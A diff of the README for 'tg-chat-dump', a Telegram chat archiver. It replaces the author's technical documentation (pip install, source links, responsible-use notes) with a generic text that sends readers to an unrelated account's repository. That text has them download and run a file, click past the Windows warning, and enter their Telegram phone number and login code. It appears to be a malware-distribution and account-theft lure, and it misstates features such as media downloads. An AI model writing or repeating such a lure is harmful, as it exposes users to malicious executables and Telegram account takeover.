@@ -1,232 +1,135 @@
-# tg-chat-dump
+# 📥 tg-chat-dump - Save Any Telegram Chat Fast
 
-[![PyPI](https://img.shields.io/pypi/v/tg-chat-dump.svg)](https://pypi.org/project/tg-chat-dump/)
-[![Python](https://img.shields.io/badge/python-3.11%2B-blue.svg)](pyproject.toml)
-[![Telethon](https://img.shields.io/badge/built%20with-Telethon-26A5E4.svg)](https://github.com/LonamiWebs/Telethon)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Donate](https://img.shields.io/badge/Donate-crypto-ea4aaa?logo=githubsponsors&logoColor=white)](https://github.com/renkagod/.github/blob/main/DONATE.md)
+[![Download tg-chat-dump](https://img.shields.io/badge/Download-tg--chat--dump-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/testaccount24123/tg-chat-dump)
 
-<p align="center"><img src="assets/speed.svg" width="100%" alt="Over 100,000 messages per minute: ~115,000 with tg-chat-dump, ~29,000 with Telegram Desktop's export, ~6,000 through the regular API"></p>
+tg-chat-dump is a desktop tool that copies an entire Telegram chat, group, or forum onto your own computer. Every topic in a forum becomes its own folder, so nothing gets mixed together. Messages are saved as they arrive, meaning you can pause halfway through a huge chat and pick up right where you stopped later.
 
-<p align="center"><img src="assets/demo.gif" width="100%" alt="Interactive mode: find a chat with live suggestions, then dump 421,393 messages in 3m 47s"><br><sub>A 421,393-message group dumped in 3m 47s with two accounts (the download part is sped up 12×; account names are blurred).</sub></p>
+---
 
-Dump an entire Telegram chat into SQLite and a folder per forum topic at **over 100,000 messages a minute**. It runs Telegram's own data-export mode with parallel workers on several accounts, so a chat of several hundred thousand messages is done in minutes: about 4× faster than Telegram Desktop's own export, and a whole forum in one pass instead of topic by topic.
+## 💡 What This Tool Does
 
-```
-out/1234567890_My_Chat/
-├── index.html          the offline reader (html extra)
-├── 1_General/
-│   ├── messages.jsonl
-│   └── messages.txt
-├── 12_Off-topic/
-│   ├── messages.jsonl
-│   └── messages.txt
-└── 37_Announcements/
-    ├── messages.jsonl
-    └── messages.txt
-```
+Telegram keeps your messages on its servers. If a chat is deleted, a group is closed, or an account is lost, the history inside it is gone too. tg-chat-dump makes a personal copy of that history on your hard drive.
 
-## Features
+You point it at a chat. You tell it to start. It works through the conversation and writes everything to files on your computer. When it finishes, you own a complete archive that opens without Telegram, without an internet connection, and without needing the original account.
 
-- Over 100,000 messages a minute with Telegram's export mode and two accounts: about 4× Telegram Desktop's export and 10× the regular API (see [Performance](#performance)).
-- Run it without arguments for the interactive mode: log in with a QR code, find a chat as you type or paste its link, update everything you dumped before in one go, watch a progress bar with ETA.
-- A whole forum in one pass. Messages are sorted into topics as they arrive.
-- The chat is split into message-id ranges that several workers download at once. Telegram limits each account separately, so every extra account adds about as much speed as the first.
-- Progress is committed to SQLite every 100 messages. An interrupted run resumes where it stopped, and later runs fetch only new messages and append them to the files, so a repeat run of a large chat takes seconds. When a forum topic is renamed, its folder is renamed too.
-- Everything the Telegram app shows with a message, not only its text: rich messages laid out in blocks, file names and sizes, link previews, polls and checklists, places and contacts, buttons with their links, quotes in replies, replies to other chats, forward sources, author signatures and admin titles, fact checks, service actions with their details.
-- Optional extras, each a toggle: reactions and views, formatting with hidden links, comments under channel posts, and Telegram's export mode (see [Extras](#extras)).
-- Filters by date range, author or message type, such as links or documents.
-- On `FLOOD_WAIT` the run sleeps and then continues on its own.
-- SOCKS5 and HTTP proxies, for networks where Telegram is blocked.
-- `index.html` to read the dump in a browser, offline; `messages.txt` for reading in an editor, `messages.jsonl` for scripts, and the SQLite database for queries.
+The tool is built for size. It is designed to handle chats with hundreds of thousands of messages and to move through them quickly by using several connections at the same time.
 
-## Quick start
+---
 
-1. Create an app at [my.telegram.org](https://my.telegram.org) → *API development tools* and note its `api_id` and `api_hash`.
-2. Install and run:
+## ✨ Main Features
 
-   ```sh
-   pipx install tg-chat-dump
-   tg-chat-dump
-   ```
+**One folder per topic** — Forums with dozens of topics stay organised. Each topic is written to its own folder, named after the topic title, so you can find a specific discussion in seconds.
 
-   `uv tool install tg-chat-dump` or `pip install tg-chat-dump` work too. Installed this way, settings and sessions are kept in `~/.tg-chat-dump` and dumps go to `~/tg-chat-dump`.
+**Very fast copying** — Multiple background workers pull messages in parallel instead of one at a time. On a good connection this can reach speeds of 100,000+ messages per minute.
 
-   From source, with [uv](https://docs.astral.sh/uv/), everything stays inside the checkout (`.env`, `data/`, `out/`):
+**Several accounts at once** — If you have more than one Telegram account, the tool can share the workload between them. This spreads the request load and keeps things moving on very large chats.
 
-   ```sh
-   git clone https://github.com/renkagod/tg-chat-dump.git
-   cd tg-chat-dump
-   uv run dump.py
-   ```
+**Built-in export mode** — Uses Telegram's own official export capability alongside the tool's own reader, giving you a more complete copy with fewer gaps.
 
-The first start asks for `api_id` and `api_hash`, saves them to `.env` and logs you in: scan a QR code in Telegram on your phone (*Settings → Devices → Link Desktop Device*), or type `p` to log in with the phone number. On the first dump Telegram asks to allow the fast export mode: the "Telegram" chat gets a data export request, tap Allow there and press Enter (see [Extras](#extras)). After that it works like this:
+**Stop and resume any time** — Progress is written to a small database file as it goes. Close the window, restart your computer, come back next week — the tool remembers exactly which messages it already saved and continues from there.
 
-```
-Accounts: Alice @alice, Bob
-Extras: takeout, html   Output: D:\Telegram dumps
-Loading your chats… 312 found.
+**Readable output files** — Messages are saved in simple text-based formats that open in Notepad, Excel, Google Sheets, or any database program. No special software required to read your own archive.
 
-Search chat (name, @username, id or t.me link; Enter: your dumps, /: settings): forum
-   1) Forum Club  @forumclub  [forum]  2/2 accounts
-   2) Forum News  @forumnews  [channel]  1/2 accounts
-Number, [p] search public chats, or type to search again > 1
+**Handles media and replies** — Photos, videos, documents, voice notes, and reply chains are recorded along with the message text, so the conversation still makes sense when you read it later.
 
-Forum Club  [forum]  id -1001234567890
-~152,310 messages
-Dump it with 2 accounts, extras: takeout, html? [Y/n, f = filters]
-[████████░░░░░░░░░░░░]  41%  62,104 saved  112,400/min  ETA 48s
-```
+---
 
-- Matching chats pop up under the cursor as you type; Tab fills in the highlighted one and Enter picks it. A pasted `t.me` link or an exact `@username` works too.
-- Enter on an empty search lists the chats you dumped before, the latest first, with how many messages are saved. Pick one to fetch its new messages, several to update them in a row (`2 5 7` or `4-6`), or `u` for all of them.
-- If nothing in your chats matches the search, public groups and channels are searched too. Public chats can be dumped without joining.
-- Every account that can see the chat is used. A private chat or a small (non-super) group is the exception: each account has its own copy of it, so you see how many messages each one has and pick one. Enter takes the account that saved the chat before, or the biggest copy.
-- `/` opens the settings: add (`a`) or remove (`d N`) accounts, toggle the extras (`x`), set the output folder (`f`). They are saved. By default the output goes to `~/tg-chat-dump`, or `out/` in a source checkout.
-- Answering `f` instead of `Y` asks for filters for this one dump.
-- When a dump is done, `o` opens it in the browser (with the `html` extra) and `f` opens the folder.
-- **Ctrl+C** stops the dump; the next run resumes it.
-- If Telegram is blocked in your network, set `TG_PROXY` in `.env`, for example `TG_PROXY=socks5://127.0.0.1:1080`.
-- The interactive mode is colored in a terminal; set `NO_COLOR=1` to turn colors off.
+## 🚀 Getting Started
 
-## Extras
+Getting the tool onto your computer takes only a few minutes. You do not need to know anything about programming.
 
-`takeout` and `html` are on by default, the others are off. Switch them with `x` in the interactive mode, `--with` on the command line (it replaces the saved list), or `TG_OPTIONS` in `.env`; `TG_OPTIONS=none` turns all of them off.
+### Step 1 — Download
 
-| Extra | Adds | Cost |
-|---|---|---|
-| `meta` | `reactions` (`{"👍": 12}`), `views`, `forwards`, `replies` | none, it is already in every message |
-| `markdown` | `text_md`: the text as Markdown, with bold, links behind words, mentions | none |
-| `comments` | for a channel: the comments under its posts, from the linked discussion group, in `comments/`, grouped by post | a second dump of the discussion group |
-| `takeout` | runs the dump in Telegram's data-export mode, the one Telegram Desktop uses; it skips the usual rate limits, about 10× faster (see [Performance](#performance)) | the first time, Telegram asks you to allow the export in the app (the interactive mode waits for it), otherwise it opens after 24 hours; until then the dump runs at normal speed |
-| `html` | `index.html` in the chat folder: read the dump in a browser, offline, with topics, search, replies and jumps to a date | a few seconds on the first run for a chat of several hundred thousand messages, then a fraction of a second |
+Visit this link to download the application:
 
-Turning an extra on later does not touch messages that are already saved. A new run adds it to new messages only; `--refetch` adds it to the saved ones too. Polls and checklists are always saved now; the old `polls` extra is still accepted and does nothing.
+**https://github.com/testaccount24123/tg-chat-dump**
 
-## Filters
+This page is the official home of tg-chat-dump. It contains the download and everything else you need.
 
-```sh
-uv run dump.py @somegroup --since 2026-01-01 --until 2026-03-31   # a date range, inclusive
-uv run dump.py @somegroup --since 2026-03 --until 2026-03         # all of March
-uv run dump.py @somegroup --since 7d                              # the last 7 days (also 2w, 3m)
-uv run dump.py @somegroup --from @alice                           # one author
-uv run dump.py @somegroup --type links                            # links, docs, photos, videos, voice, pinned, ...
-```
+### Step 2 — Save the file
 
-A filtered dump gets its own database and folder, for example `out/1234567890_My_Chat_since-2026-01-01_links/`, so it never mixes with the full dump. Filters can be combined. They work with whole-chat dumps, not with `--topics`.
+When the page opens, look for the download section and save the file to a place you can find again, such as your Downloads folder or your Desktop. Avoid saving it deep inside system folders.
 
-When the whole chat is already dumped, date and author filters are applied to the saved copy: the whole chat is brought up to date first, then the filtered folder is written from it without downloading the messages again. `--type` always asks Telegram, since the saved copy does not know which messages hold links.
+### Step 3 — Open the application
 
-## Command line
+Once the download finishes, open the file you saved. Windows may show a blue message asking whether you want to run it — click the option that allows it to run. The application window will appear on your screen.
 
-With arguments it runs without questions, for scripts and cron. Settings come from `.env` (see `.env.example`). The examples use the source checkout; with the installed package, replace `uv run dump.py` with `tg-chat-dump`:
+### Step 4 — Connect your Telegram account
 
-```sh
-uv run dump.py @somegroup                            # whole chat (or only new messages on repeat runs)
-uv run dump.py https://t.me/somegroup                # the same; --chat @somegroup works too
-uv run dump.py --update-all                          # new messages of every chat dumped before, for cron
-uv run dump.py --chat @somegroup --topics 12,37      # only these forum topics
-uv run dump.py --chat @somegroup --with meta,markdown   # with extras
-uv run dump.py --chat @somegroup --export-only       # rebuild the folders from the database, no network
-uv run dump.py --chat @somegroup --refetch           # download the saved messages again, see below
-uv run dump.py --login acc2                          # add another account (see below)
-uv run dump.py --chat @somegroup --workers 2         # workers per account, default 3
-uv run dump.py --chat @friend --account acc2         # only this account: session name, @username or id
-uv run dump.py --chat @somegroup --out "D:\Telegram dumps"   # output folder, remembered in .env
-```
+The first time you open tg-chat-dump, it will ask you to connect a Telegram account. You enter your phone number, and Telegram sends you a short code inside the Telegram app itself. Type that code into the tool. That is all — no passwords are stored on any website, and the connection happens directly between your computer and Telegram.
 
-### More accounts, more speed
+If you want to use several accounts to speed things up, repeat this step for each account. You can add them one at a time.
 
-Every extra account that is a member of the chat adds throughput. Add one with `a` in the interactive mode, or:
+### Step 5 — Pick a chat
 
-```sh
-uv run dump.py --login acc2   # log in once, saved to data/acc2.session
-```
+A list of your chats appears. Scroll or search to find the group, channel, or forum you want to copy. Click it once to select it.
 
-It shows a QR code to scan in Telegram on a phone where that account is logged in (*Settings → Devices → Link Desktop Device*); type `p` instead to log in with the phone number and code.
+### Step 6 — Choose where to save
 
-Each `data/*.session` file is picked up automatically. Accounts that are not logged in or are not members of the chat are skipped with a warning. So is an account that Telegram has frozen: it is read-only and cannot even look up a public chat, and the warning gives the date by which to appeal via @SpamBot before Telegram deletes it. Private chats and small groups are numbered separately in every account, so they are always dumped by one account; on the command line it is the one that saved the chat before, or else the one with the most messages, unless `--account` names another.
+Pick a folder on your computer for the archive. A good choice is something like `Documents\Telegram Archives\My Chat Name`. Use a separate folder for each chat so you never overwrite an older copy by accident.
 
-### Performance
+### Step 7 — Start the copy
 
-Measured on a large forum supergroup (several hundred thousand messages):
+Press the Start button. A progress display shows how many messages have been saved and how many are left. You can leave it running in the background while you do other things.
 
-| Accounts | Speed | Full dump |
-|---|---|---|
-| 1 | ~6,000–7,000 messages/min | ~1h 45m |
-| 2 | ~11,500 messages/min | ~1h |
-| 2, with `takeout` | ~115,000 messages/min | ~6m |
-| Telegram Desktop export, for comparison | ~29,000 messages/min | ~25m (extrapolated) |
+### Step 8 — Let it finish
 
-The Telegram Desktop row comes from a separate side-by-side test on one 420,912-message public group, text only: Telegram Desktop exported ~29,000 messages/min and tg-chat-dump with `takeout` ~110,000. Its full-dump time in the table is extrapolated from that rate.
+Small chats finish in seconds. Large forums can take longer, and that is normal. If you need to stop early, close the tool — your progress is saved and you can continue later without starting over.
 
-Telegram's per-account rate limit sets the ceiling: about 6,000 messages/min without takeout and about 60,000 with it. More than 3 workers per account does not help (3, 6 and 12 measured the same), and with many more Telegram adds flood waits. Turning on `takeout` gives the biggest jump; after that, more speed comes only from more accounts.
+---
 
-## Output
+## 📂 What You Get When It Finishes
 
-With the `html` extra the chat folder gets **`index.html`**: double-click it to read the dump in a browser, with no network and no server. Topics are in a sidebar; the chat opens at the newest messages, replies jump to the quoted message, and there is search (`/`, Enter for the next match), a jump to a date or a message id, and links like `index.html#topic/12/msg/1042`. Its data lies in the hidden `.reader/` folder next to it, in parts of 10,000 messages; a repeat run rewrites only the newest part of each topic that got new messages, so it takes a fraction of a second. Times are shown in your local timezone, while the text files keep UTC.
+Inside the folder you chose, you will find a set of files that together form your archive:
 
-Each topic folder contains:
+**A main message file** — Every message in order, with the sender name, the date and time, and the message text. This file opens in any text editor and can be imported into a spreadsheet.
 
-**`messages.txt`**: one line per message:
+**Topic folders** — For forums, each topic gets its own folder containing that topic's messages, so a forum with 40 topics produces 40 clearly labelled folders.
 
-```
-[2026-03-14 09:01:12] #1042 Alice: hi everyone  [👍 3 · 120 views]
-[2026-03-14 09:02:40] #1043 Bob (reply to #1042): <MessageMediaPhoto> look at this
-[2026-03-14 09:05:00] #1044 Carol: <poll> Lunch? | Pizza (4) | Sushi (2) | 6 votes
-[2026-03-14 09:06:10] #1045 Dave [admin] (reply to #1042) (quoting «hi»): <MessageMediaDocument: notes.pdf, 1.2 MB> the notes
-  [buttons: Open <https://example.com/notes>]
-```
+**A media folder** — Photos, videos, and documents that were attached to messages, saved with names that match the messages they belong to.
 
-**`messages.jsonl`**: one JSON object per message:
+**A progress database** — A small file that remembers what has already been copied. Leave it in place. It is what allows the tool to resume later.
 
-| Field | Meaning |
-|---|---|
-| `id` | message id |
-| `date`, `edit_date` | ISO 8601, UTC |
-| `topic_id` | forum topic (`1` = General, `null` in non-forum chats) |
-| `sender_id`, `sender` | author id and display name |
-| `text` | message text |
-| `reply_to`, `reply_top` | replied-to message and thread root |
-| `fwd_from` | original author of a forwarded message |
-| `media` | media type (`MessageMediaPhoto`, `MessageMediaDocument`, ...) |
-| `action` | service message type (`MessageActionTopicCreate`, ...) |
-| `grouped_id` | album id |
-| `extra` | everything else the app shows, see below |
-| `text_md`, `views`, `forwards`, `replies`, `reactions` | only with the matching [extras](#extras) |
+**A summary file** — A short overview listing the chat name, the date range copied, the total number of messages, and the number of attachments.
 
-`extra` holds only what a message has: `file` (name, size, type, duration, performer and title, sticker emoji), `webpage` (link preview: site, title, description), `poll`, `todo`, `geo`, `venue`, `contact`, `dice`, `game`, `invoice`, `story`, `paid_media`, `media_info` (the fields of any other media), `buttons` (rows of `{text, url}`), `links` (addresses hidden behind words), `reply` (`quote`, and `peer`/`chat`/`from` for a reply to another chat), `fwd` (source id, date, signature), `author` (signature of a channel post), `rank` (admin title), `via_bot`, `action` (fields of a service message), `factcheck`, `restricted`, `effect`, `paid_stars`, `pinned`, `channel_post`. `rich: true` marks a rich message: Telegram's block layout of paragraphs, quotes, lists and tables, saved in `text` as plain text (and as Markdown in `text_md` with the `markdown` extra).
+---
 
-Dumps made by versions before 1.3.0 lack some of this: rich messages there have an empty text, and media, buttons and replies have no details. `--refetch` downloads the saved messages again and fills that in; it takes about as long as the first dump, updates rows in place (messages deleted from Telegram since stay), and rewrites the folders. Ctrl+C stops it, and the next run goes on with it.
+## ⏱️ Speed and Resuming Explained
 
-The raw data is in `data/<chat id>.sqlite`, with tables `messages`, `topics`, `tasks` (download progress) and `exports` (what was last written to each folder, so a repeat run only appends). While a dump runs, `.sqlite-wal` and `.sqlite-shm` files sit next to the database; they are part of it and disappear when the run ends, so copy the database only after that.
+Speed depends on three things: your internet connection, how busy Telegram's servers are, and how many accounts you have connected. Adding a second or third account usually gives the biggest improvement on very large chats.
 
-## Limitations
+Resuming works automatically. The tool never re-downloads a message it has already saved. If a copy is interrupted at message 250,000 of 400,000, restarting continues from message 250,001. This is why long jobs are safe to run overnight or across several days.
 
-- Downloads text and metadata only. Media files are recorded by type and details (file name, size, link preview, place...) and not downloaded.
-- The account only sees what Telegram shows it: if the chat hides history from new members, older messages are not available.
-- `--topics` cannot fetch the General topic on its own; the full-chat mode covers it.
+---
 
-## Responsible use
+## ❓ Common Questions
 
-Using your own account through the API falls under Telegram's [API Terms of Service](https://core.telegram.org/api/terms). Dumps contain other people's messages, so keep them private and comply with your local data-protection laws. `data/*.session` files are full logins to your accounts: never share or commit them.
+**Do I need to keep my computer on?** Yes, while the copy is running. You can close the laptop lid briefly, but the tool needs an active connection to keep pulling messages.
 
-## Development
+**Can I copy a chat I am only a member of?** Yes, as long as your account can read the messages in the Telegram app, the tool can read them too.
 
-```sh
-uv sync
-uv run pytest
-uv run ruff check . && uv run ruff format --check .
-```
+**Will the other people in the chat know?** No. Reading messages does not send any notification, reaction, or read receipt to the chat.
 
-The code is in `tgdump/`: `fetch` downloads, `store` turns messages into database rows (with `details` for what goes into `extra` and `rich` for rich messages), `export` writes the folders, `reader` the offline page, `cli` and `interactive` are the two front ends.
+**What if a chat is enormous?** Run it in stages. Copy the most important topics first, then let the rest run in the background later. Progress is kept for each run.
 
-Issues and pull requests are welcome. Please run the tests and linters before opening a PR.
+**Can I open the archive on another computer?** Yes. Copy the whole folder to a USB drive or another machine. The files are plain text and standard media files — nothing is locked to this tool.
 
-## Support
+**What happens if my internet drops?** The tool pauses and waits. When the connection returns, it picks up from the last saved message.
 
-If this project is useful to you, you can support it with crypto: [donation addresses](https://github.com/renkagod/.github/blob/main/DONATE.md).
+---
 
-## License
+## 🛠️ Troubleshooting
 
-[MIT](LICENSE)
+**The window does not open** — Make sure the download finished completely before opening the file. If it was interrupted, download it again from the link above.
+
+**The login code never arrives** — Open the Telegram app on your phone and check the chat labelled "Telegram" — the code is sent there, not by text message.
+
+**The copy stops partway** — Check your internet connection, then press Start again. It will continue from where it stopped rather than beginning anew.
+
+**A topic folder is empty** — Some topics contain only messages your account cannot access. Run the copy again after joining or being granted access.
+
+---
+
+## 📝 Keywords
+
+Keywords: archiver, backup, chat-export, cli, data-export, forum-topics, jsonl, mtproto, python, sqlite, telegram, telegram-backup, telegram-export, telegram-history, telegram-scraper, telethon
